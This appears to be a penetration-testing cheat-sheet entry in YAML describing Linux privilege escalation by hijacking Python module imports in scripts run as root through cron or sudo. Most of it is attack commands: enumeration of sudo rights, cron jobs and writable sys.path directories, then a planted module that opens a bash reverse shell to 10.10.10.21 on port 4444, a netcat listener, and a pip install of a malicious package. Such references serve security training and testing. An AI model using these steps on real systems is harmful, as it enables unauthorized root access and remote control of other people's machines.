---
description: |
  Hijack Python module imports by placing a malicious module in a writable path that takes priority, escalating privileges when the script runs as root.
command: |
  # Find Python scripts run as root (cron, sudo):
  sudo -l
  cat /etc/crontab
  ls -la /etc/cron.d/
  grep -r "python" /etc/cron* 2>/dev/null

  # Check the Python module search path:
  python3 -c "import sys; print('\n'.join(sys.path))"

  # Check write permissions on module directories:
  python3 -c "import sys; print('\n'.join(sys.path))" | xargs -I{} ls -ld {} 2>/dev/null

  # Identify which modules the target script imports:
  cat /path/to/target_script.py | grep import

  # Create malicious module (e.g., if script imports "library"):
  cat << 'EOF' > /writable/path/library.py
  import os
  os.system("bash -i >& /dev/tcp/10.10.10.21/4444 0>&1")
  EOF

  # Alternative — pip install to writable path:
  pip install malicious_package --target /writable/path/

  # Wait for cron or trigger sudo execution:
  # If via sudo:
  sudo /usr/bin/python3 /path/to/target_script.py
  # If via cron, start listener and wait:
  nc -lvnp 4444
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Library_Hijack
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking
  - https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
---
